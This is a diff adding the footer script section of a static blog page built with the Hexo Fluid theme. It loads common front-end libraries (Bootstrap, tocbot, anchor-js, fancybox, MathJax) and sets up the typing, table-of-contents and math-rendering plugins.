+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
